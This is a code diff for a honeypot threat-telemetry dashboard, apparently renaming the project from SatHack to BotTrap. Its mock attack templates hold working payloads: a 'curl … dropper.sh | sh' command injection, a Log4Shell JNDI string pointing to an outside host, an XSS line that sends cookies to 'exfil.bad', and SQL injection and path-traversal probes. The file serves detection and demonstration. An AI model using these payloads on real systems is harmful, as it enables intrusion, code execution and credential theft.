@@ -51,7 +51,7 @@ const DECOY_ENDPOINTS = [
 
 const HONEYPOT_NODE = {
   id: 'IN-NODE-01',
-  name: 'SatHack Sensor (Mumbai, IN)',
+  name: 'BotTrap Sensor (Mumbai, IN)',
   lat: 19.076,
   lon: 72.8777,
 };
@@ -163,7 +163,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/admin/login',
     payload: 'username=admin&password=bt_live_98a7••••',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: curl/8.5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: curl/8.5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
     aiSummary: 'Used the fake api_key leaked at /.env 87s earlier. The attacker read the leak and tried it.',
     aiIntent: 'Human operator extracted decoy credentials from /.env and attempted authenticated administrative login.',
     confidence: 100,
@@ -182,7 +182,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/api/v1/login',
     payload: 'username=admin;curl -s http://185.220.101.42/dropper.sh | sh&password=x',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (compatible; zgrab/0.x)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (compatible; zgrab/0.x)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
     aiSummary: 'Remote shell dropper invocation attempting to fetch and execute an unverified second-stage ELF binary directly via POSIX sh pipe.',
     aiIntent: 'Initial foothold establishment and Mirai/botnet implant deployment.',
     confidence: 98,
@@ -201,7 +201,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/admin',
     payload: "user=admin' UNION SELECT 1,username,password_hash,email FROM users-- -&pass=123",
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Real-IP: ${ip}\nUser-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Real-IP: ${ip}\nUser-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
     aiSummary: 'Automated UNION-based SQL injection signature matching sqlmap fingerprint, targeting credential table exfiltration on /admin.',
     aiIntent: 'Database schema enumeration and administrative credential dumping.',
     confidence: 97,
@@ -220,7 +220,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/.env',
     payload: 'GET /../../../../etc/passwd?file=..%2f..%2f.env HTTP/1.1',
     rawRequest: (ip, path) =>
-      `GET ${path}?debug=../../../../etc/passwd HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\nAccept: */*\nConnection: close`,
+      `GET ${path}?debug=../../../../etc/passwd HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\nAccept: */*\nConnection: close`,
     aiSummary: 'Directory traversal and environment secret harvesting probe using encoded relative path sequences to read local system files.',
     aiIntent: 'Extract AWS/DB credentials from .env or local user accounts from /etc/passwd.',
     confidence: 94,
@@ -239,7 +239,7 @@ const ATTACK_TEMPLATES = [
     targetPath: 'SSH:22',
     payload: 'user=root auth=password pass="admin2026!" (attempt #47/min)',
     rawRequest: (ip, path, payload) =>
-      `[SSH-2.0-OpenSSH_8.9p1 SatHack-Tarpit]\nSRC=${ip}:51842 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-libssh2_1.10.0\nAUTH_METHOD: password\nPAYLOAD: ${payload}\nTARPIT_DELAY: 4200ms`,
+      `[SSH-2.0-OpenSSH_8.9p1 BotTrap-Tarpit]\nSRC=${ip}:51842 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-libssh2_1.10.0\nAUTH_METHOD: password\nPAYLOAD: ${payload}\nTARPIT_DELAY: 4200ms`,
     aiSummary: 'High-velocity dictionary attack against SSH daemon port 22 using automated libssh2 spray worker targeting privileged root account.',
     aiIntent: 'Gain interactive shell access for cryptomining or lateral proxy pivoting.',
     confidence: 96,
@@ -258,7 +258,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/wp-login.php',
     payload: 'log=wp_admin&pwd=Summer2025!@#&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: python-requests/2.31.0\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: python-requests/2.31.0\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
     aiSummary: 'Automated credential replay against WordPress authentication decoy using leaked corporate password list patterns.',
     aiIntent: 'Compromise CMS admin panel to upload webshell or inject SEO spam.',
     confidence: 89,
@@ -277,7 +277,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/api/v1/login',
     payload: "id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
     rawRequest: (ip, path, payload) =>
-      `GET ${path}?${encodeURIComponent(payload)} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Real-IP: ${ip}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\nAccept: application/json`,
+      `GET ${path}?${encodeURIComponent(payload)} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Real-IP: ${ip}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\nAccept: application/json`,
     aiSummary: 'Time-based blind SQL injection probe using MySQL SLEEP(5) oracle to confirm injectable query parameter without visible error output.',
     aiIntent: 'Confirm blind SQLi vulnerability for automated boolean data extraction.',
     confidence: 93,
@@ -296,7 +296,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/admin',
     payload: 'q=<svg/onload=fetch("https://exfil.bad/c?d="+btoa(document.cookie))>',
     rawRequest: (ip, path, payload) =>
-      `GET ${path}?${payload} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\nAccept: text/html`,
+      `GET ${path}?${payload} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\nAccept: text/html`,
     aiSummary: 'Reflected/Stored XSS vector utilizing SVG onload event handler designed to exfiltrate admin session cookies to external collector.',
     aiIntent: 'Session hijacking of SOC/admin operators reviewing dashboard logs.',
     confidence: 87,
@@ -315,7 +315,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/.env',
     payload: 'GET /.env.production HTTP/1.1 (automated cloud secret scanner)',
     rawRequest: (ip, path) =>
-      `GET ${path}.production HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip`,
+      `GET ${path}.production HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip`,
     aiSummary: 'Opportunistic internet-wide scanner checking for exposed dotenv configuration files and cloud API keys.',
     aiIntent: 'Reconnaissance for misconfigured webroot secrets (AWS/Stripe/SMTP).',
     confidence: 84,
@@ -334,7 +334,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/wp-login.php',
     payload: '${jndi:ldap://193.142.146.35:1389/Basic/Command/Base64/d2dldCBodHRwOi8v...}',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: ${payload}\nX-Api-Version: ${payload}\nContent-Length: 0`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: ${payload}\nX-Api-Version: ${payload}\nContent-Length: 0`,
     aiSummary: 'Log4Shell (CVE-2021-44228) JNDI LDAP lookup injection embedded in HTTP User-Agent and X-Api-Version headers.',
     aiIntent: 'Trigger remote class loading and arbitrary Java deserialization RCE.',
     confidence: 99,
@@ -353,7 +353,7 @@ const ATTACK_TEMPLATES = [
     targetPath: 'SSH:22',
     payload: 'user=ubuntu auth=publickey key_fp=SHA256:9xK2...m8P (probe)',
     rawRequest: (ip, path, payload) =>
-      `[SSH-2.0-OpenSSH_8.9p1 SatHack-Tarpit]\nSRC=${ip}:44120 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-Go\nPAYLOAD: ${payload}`,
+      `[SSH-2.0-OpenSSH_8.9p1 BotTrap-Tarpit]\nSRC=${ip}:44120 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-Go\nPAYLOAD: ${payload}`,
     aiSummary: 'Low-rate SSH key enumeration probe checking default cloud image username (ubuntu) availability.',
     aiIntent: 'Identify active SSH targets prior to credential stuffing campaign.',
     confidence: 78,
@@ -502,7 +502,7 @@ function usePolling(endpoint, { enabled = true, intervalMs = 3500, mockFactory }
 }
 
 // ============================================================================
-// ERROR BOUNDARY (Mirrors SatHack-main/frontend/src/lib/ErrorBoundary.jsx)
+// ERROR BOUNDARY (Mirrors BotTrap/frontend/src/lib/ErrorBoundary.jsx)
 // ============================================================================
 
 class ErrorBoundary extends React.Component {
@@ -597,10 +597,7 @@ function Navbar({
           </div>
           <div className="flex items-center gap-2.5 min-w-0">
             <span className="font-semibold tracking-[0.14em] text-sm text-[#F0F2F5]">
-              SATHACK
-            </span>
-            <span className="hidden sm:inline-flex items-center px-2 py-0.5 text-[10px] font-mono tracking-wider text-[#8A93A2] bg-[#0E1014] border border-[#1E232C] rounded-[4px]">
-              HONEYPOT TELEMETRY v2.4
+              BOTTRAP
             </span>
           </div>
         </div>
@@ -690,7 +687,7 @@ function Navbar({
           {/* Architecture / About Button */}
           <button
             onClick={onOpenAbout}
-            title="SatHack Architecture & Pipeline"
+            title="BotTrap Architecture & Pipeline"
             className="h-8 w-8 sm:w-auto sm:px-2.5 rounded-[4px] bg-[#0E1014] border border-[#1E232C] hover:border-[#2E3543] text-xs text-[#8A93A2] hover:text-[#F0F2F5] flex items-center justify-center gap-1.5 transition-colors"
           >
             <Info className="w-3.5 h-3.5" />
@@ -1238,7 +1235,7 @@ function AttackMap({ events, activeActor, onSelectActor }) {
                     strokeOpacity={0.85}
                     strokeWidth={isSelected ? 1.8 : 1.1}
                     strokeDasharray="6 140"
-                    className="sathack-arc-flow"
+                    className="bottrap-arc-flow"
                   />
                 </g>
               );
@@ -1913,7 +1910,7 @@ function LiveFeed({ events, selectedEventId, onInspectEvent }) {
                     key={ev.id}
                     onClick={() => onInspectEvent(ev)}
                     className={`cursor-pointer transition-colors relative ${
-                      ev.isNew ? 'sathack-new-row' : ''
+                      ev.isNew ? 'bottrap-new-row' : ''
                     } ${
                       isSelected ? 'bg-[#14171D]' : 'hover:bg-[#14171D]/70'
                     }`}
@@ -2036,7 +2033,7 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
         onClick={onClose}
       />
 
-      <aside className="relative z-10 w-full max-w-xl bg-[#0E1014] border-l border-[#2E3543] h-full flex flex-col shadow-2xl sathack-drawer-in">
+      <aside className="relative z-10 w-full max-w-xl bg-[#0E1014] border-l border-[#2E3543] h-full flex flex-col shadow-2xl bottrap-drawer-in">
         <div
           className="h-[1px] w-full shrink-0"
           style={{
@@ -2296,7 +2293,7 @@ function AboutModal({ open, onClose }) {
         <div className="px-5 py-4 border-b border-[#1E232C] flex items-center justify-between">
           <div>
             <h3 className="text-sm font-mono font-semibold text-[#F0F2F5] tracking-wider uppercase">
-              SatHack Pipeline Architecture
+              BotTrap Pipeline Architecture
             </h3>
             <p className="text-xs text-[#8A93A2] mt-0.5">
               End-to-end deceptive telemetry, canary token traps, and AI-assisted SOC triage
@@ -2337,7 +2334,7 @@ function AboutModal({ open, onClose }) {
         </div>
 
         <div className="px-5 py-3 bg-[#08090B] border-t border-[#1E232C] flex items-center justify-between text-[11px] font-mono text-[#525B6A]">
-          <span>SATHACK-MAIN // HONEYPOT + CANARY TOKENS + FASTAPI + LLM + REACT</span>
+          <span>BOTTRAP // HONEYPOT + CANARY TOKENS + FASTAPI + LLM + REACT</span>
           <button
             onClick={onClose}
             className="px-3 py-1 bg-[#14171D] border border-[#2E3543] rounded-[4px] text-[#F0F2F5] hover:bg-[#1E232C]"
@@ -2486,7 +2483,7 @@ export default function App() {
         const crit = filteredEvents.filter((e) => e.severity === 'CRITICAL').length;
         const uniqueIps = new Set(filteredEvents.map((e) => e.ip)).size;
         const lines = [
-          `# SatHack Honeypot Threat Intelligence Report`,
+          `# BotTrap Honeypot Threat Intelligence Report`,
           `- **Generated:** ${new Date().toISOString()}`,
           `- **Sensor Node:** ${HONEYPOT_NODE.name} (${HONEYPOT_NODE.id})`,
           `- **Filtered Events:** ${filteredEvents.length} (${crit} Critical, ${uniqueIps} Unique IPs)`,
@@ -2509,7 +2506,7 @@ export default function App() {
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `sathack-threat-report-${ts}.${ext}`;
+      a.download = `bottrap-threat-report-${ts}.${ext}`;
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
@@ -2525,26 +2522,26 @@ export default function App() {
         {/* Precision Animations & Tabular Numerals */}
         <style>{`
           .tabular-nums { font-variant-numeric: tabular-nums; }
-          @keyframes sathackArcFlow {
+          @keyframes bottrapArcFlow {
             from { stroke-dashoffset: 146; }
             to { stroke-dashoffset: 0; }
           }
-          .sathack-arc-flow {
-            animation: sathackArcFlow 2.6s linear infinite;
+          .bottrap-arc-flow {
+            animation: bottrapArcFlow 2.6s linear infinite;
           }
-          @keyframes sathackNewRow {
+          @keyframes bottrapNewRow {
             0% { background-color: rgba(20, 184, 166, 0.12); }
             100% { background-color: transparent; }
           }
-          .sathack-new-row {
-            animation: sathackNewRow 2.2s ease-out;
+          .bottrap-new-row {
+            animation: bottrapNewRow 2.2s ease-out;
           }
-          @keyframes sathackDrawerIn {
+          @keyframes bottrapDrawerIn {
             from { transform: translateX(28px); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
           }
-          .sathack-drawer-in {
-            animation: sathackDrawerIn 0.18s cubic-bezier(0.16, 1, 0.3, 1);
+          .bottrap-drawer-in {
+            animation: bottrapDrawerIn 0.18s cubic-bezier(0.16, 1, 0.3, 1);
           }
         `}</style>
 
